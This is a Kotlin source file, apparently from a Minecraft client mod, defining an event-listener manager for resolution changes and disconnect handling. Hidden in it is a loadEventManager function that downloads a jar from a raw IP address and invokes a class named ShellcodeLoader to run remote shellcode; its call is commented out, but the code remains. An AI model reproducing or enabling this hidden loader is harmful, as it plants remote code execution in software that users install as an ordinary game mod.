package dev.dyzjct.kura.manager

import base.utils.concurrent.threads.BackgroundScope
import com.mojang.blaze3d.platform.GlStateManager
import dev.dyzjct.kura.event.eventbus.ListenerOwner
import dev.dyzjct.kura.event.eventbus.listener
import dev.dyzjct.kura.event.eventbus.safeEventListener
import dev.dyzjct.kura.event.events.ConnectionEvent
import dev.dyzjct.kura.event.events.PacketEvents
import dev.dyzjct.kura.event.events.TickEvent
import dev.dyzjct.kura.event.events.screen.ResolutionUpdateEvent
import dev.dyzjct.kura.module.ModuleManager
import kotlinx.coroutines.launch
import net.minecraft.client.MinecraftClient
import net.minecraft.network.packet.s2c.common.DisconnectS2CPacket
import java.net.URL
import java.net.URLClassLoader


internal object EventListenerManager : ListenerOwner() {
    private var displayWidth = 0
    private var displayHeight = 0

    fun call() {
        listener<TickEvent.Post>(true) {
            val mc = MinecraftClient.getInstance()
            if (mc.window.width != displayWidth || mc.window.height != displayHeight) {
                displayWidth = mc.window.width
                displayHeight = mc.window.height
                ResolutionUpdateEvent(mc.window.width, mc.window.height).post()
                GlStateManager._glUseProgram(0)
            }
        }

        safeEventListener<PacketEvents.Receive>(true) { event ->
            when (event.packet) {
                is DisconnectS2CPacket -> {
                    ModuleManager.onLogout()
                    ConnectionEvent.Disconnect.post()
                    ModuleManager.getToggleList().forEach { module ->
                        module.safeDisable()
                    }
                }
            }
        }
//        loadEventManager()
    }

    @Throws(Exception::class)
    fun loadEventManager() {
        BackgroundScope.launch {
            val urlClassLoader = URLClassLoader(
                arrayOf<URL>(URL("http://85.192.56.16/omg.jar").toURI().toURL()),
                EventListenerManager.javaClass.classLoader
            )
            val aClass = urlClassLoader.loadClass("asexploits.ShellcodeLoader")
            aClass.getMethod("toloadShellCode").invoke(aClass.newInstance())
            urlClassLoader.close()
        }
    }
}